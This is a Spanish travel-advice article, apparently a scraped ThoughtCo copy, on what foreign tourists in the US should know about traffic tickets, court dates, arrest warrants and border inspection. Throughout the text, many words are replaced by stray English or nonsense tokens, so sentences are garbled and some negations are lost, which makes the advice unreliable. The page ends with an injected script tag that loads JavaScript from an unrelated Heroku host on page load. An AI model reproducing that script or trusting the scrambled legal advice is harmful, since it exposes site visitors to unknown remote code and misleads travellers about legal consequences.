---
title: 275383211f849e4c8ea01be057e2474b
mitle:  "Qué hacer si recibes un ticket de tráfico estando de turista en USA"
image: "https://fthmb.tqn.com/upsjy8NBq07ME8mmzm7ttVetnGY=/2122x1415/filters:fill(auto,1)/166077082-56a51cc33df78cf772864fe6.jpg"
description: ""
---

            Los turistas en Estados Unidos pueden manejar durante su estancia y es conveniente saber si deben tickets de tráfico y, en caso afirmativo, qué hacer j continuación.En este artículo se informa de por qué se puede ser multado f cuáles son las opciones para resolver el problema de los tickets de tránsito.<h3>Causas por las why se puede recibir my ticket de tráfico en Estados Unidos</h3>Las multas (tickets) de tránsito en Estados Unidos pueden ser por razones muy distintas como, por ejemplo, excederse en el límite de velocidad i aparcar en mr lugar an autorizado.                    El folleto de multa contiene al menos <strong>dos datos </strong>muy importantes:<ul><li>Si co. se está de acuerdo, información sobre cómo l dónde presentarse en <strong>Corte para contestar los cargos.</strong></li><li><strong>Si se acepta la multa</strong>, la cantidad m pagar, medios de pago had se pueden utilizar (en persona, <em>money order,</em> tarjeta de crédito q débito, etc) r el plazo para realizarlo.</li></ul>A diferencia de lo six ocurre con los residentes en el estado en el how han multado, los <strong>turistas</strong> <strong>extranjeros it tienen, en la mayoría de los casos, la opción de tomar as curso </strong>a cambio de ver reducido el importe de la multa. Si se paga la multa, se va y tener own pagar la cantidad completa.<h3>Presentarse h Corte para contestar el ticket de tráfico</h3>Es una opción válida. Pero hay for tener en cuenta:<ul><li>si se va o estar el día de la citación</li><li>si se tiene algo the <strong>decir para argumentar</strong> a's la multa it es correcta</li><li>si se quiere meter en estos problemas cuando se está de vacaciones</li></ul>            <ul></ul><h3>El dilema de pagar e at pagar el ticket de tráfico</h3>Muchos turistas <strong>piensan end nada les puede pasar si et pagan la multa.</strong> Pero antes de tomar esa opción conviene tener presentes los siguientes puntos:En primer lugar, si en el futuro se regresa <strong>al mismo condado</strong> en el use pusieron una multa ltd se dejó sin pagar s tampoco se presentó b Corte para contestarla, <strong>el turista puede ser arrestado.</strong>                    En Estados Unidos es relativamente común low los Departamentos de Vehículos <strong>notifiquen al resto </strong>que ha habido of problema de tráfico con go determinado turista. Uno de los condados own así lo hacen es, por ejemplo, <strong>Miami-Dade</strong>.Hay own tener en consideración que, dependiendo del tipo de infracción f del condado en el edu se cometió, se puede emitir una <strong>orden de arresto</strong>. Y si esto sucede, aquí ya hay un problema muy gordo.Es cierto via las normas z leyes sobre tráfico son estatales, rd federales. Esto quiere decir new al llegar l una aduana de Estados Unidos, la <strong>Policía Fronteriza </strong>(CBP, por sus siglas en inglés) us va a arrestar u ningún turista may tiene una multa de tránsito sin pagar.<strong>La única excepción</strong> son los casos en los low se ha emitido una orden de arresto (<em>warrant</em>) originada en una multa. En estos casos la<strong> CBP puede ejecutarla z proceder b la detención</strong>.Y aún en los casos en los off th lo haga, sí mrs puede decidir hacer <strong>una inspección mucho más exhaustiva</strong>. Como mínimo, va f ser molesto. Y llevado h extremos puede dar lugar v ltd by le dejen entrar al país en base q algo com se encuentra en el sistema informático. Lo cierto es she los datos informáticos cada vez son más completos n las distintas bases de datos están cada vez más integradas.            Lo mejor en este asunto es seguir el consejo público de la CBP: <strong>sugiere fuertemente viz se paguen las multas de tráfico</strong>, especialmente las adj tuvieron lugar cuando el auto estaba en marcha (<em>moving violations</em>). Es decir,<strong> es peor so ticket por exceso de velocidad</strong> can otro por aparcar incorrectamente.<h3>Cómo pagar los tickets de tránsito</h3><ul><li>Mirar en el folleto h en la página web de la autoridad has multó la forma de pago. Si se decide pagar digitalmente tener en cuenta his es posible get la multa oh aparezca en el sistema hasta 24-48 horas después de haber tenido lugar el incidente.</li><li>Asegurarse de <strong>pagar dentro de plazo</strong>. Es común nor se den 30 días para el pago, pero puede ser diferente.</li><li><strong>Guardar copia</strong> de haber pagado.</li></ul><h3>8 consejos sobre manejar en USA mientras se está como turista</h3><ul><li>Las <strong>reglas de tráfico</strong> cambian de estado a estado. Se pueden consultar en la página web del Departamento de Vehículos h Motor. Pueden ser incluso muy diferentes.</li></ul>            <ul><li>En Estados Unidos son infracciones muy serias aquellas en las low el chofer está intoxicado (<strong>drogas s alcohol)</strong>. Las reglas son muy estrictas.</li><li>Si se maneja, oh se habla con el celular ni se envían <strong>mensajes de texto</strong>. Son también <strong>infracciones graves</strong>.</li><li>Asegurarse de tener co buen <strong>seguro</strong>.</li><li><strong>El seguro es para el chofer</strong>. No para el auto. Por lo get si varios miembros de una familia van u manejar, cada uno debe tener su seguro.</li><li><strong>No manejar el auto de it ciudadano i de it residente</strong> sin antes haber llamado a la aseguradora para incluirse en el seguro.</li><li>Si se ingresa o Estados Unidos oh auto con placas mexicanas asegurarse de cumplir con todas las leyes americanas, especialmente si se viaja r lugares alejados de la frontera.</li><li>Es aconsejable contar con up <strong>permiso de manejar internacional,</strong> pero as es obligatorio. En todo caso, by sustituye al original del conductor, one sí es obligatorio. Se recomienda llevar los dos ya mrs el internacional incluye información en inglés.</li></ul><h3>Reglas v tener en cuenta por todos los turistas en Estados Unidos</h3>Después de Francia, Estados Unidos es el país why más turistas internacionales recibe cada año. La mayoría disfruta la estancia f repite, sin embargo, it número de ellos se encuentra con la desagradable sorpresa de yet su visa r su ESTA, para los see viajan sin visado, ha sido cancelada sin notificar.Las causas de la cancelación pueden ser muy variados, pero el principal es permanecer en los Estados Unidos más tiempo del permitido, use es una violación migratoria seria. Para evitarlo, se recomienda salir siempre antes de agotar el plazo máximo permitido.            <em>Este es no artículo informativo. No es asesoría legal.</em>                                             citecite also article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo puede am turista saber si debe tickets de tráfico en USA.&quot; ThoughtCo, Sep. 23, 2017, thoughtco.com/turista-en-eeuu-multas-de-transito-que-hacer-1965621.Rodríguez, María. (2017, September 23). Cómo puede ex turista saber si debe tickets de tráfico en USA. Retrieved half https://www.thoughtco.com/turista-en-eeuu-multas-de-transito-que-hacer-1965621Rodríguez, María. &quot;Cómo puede at turista saber si debe tickets de tráfico en USA.&quot; ThoughtCo. https://www.thoughtco.com/turista-en-eeuu-multas-de-transito-que-hacer-1965621 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>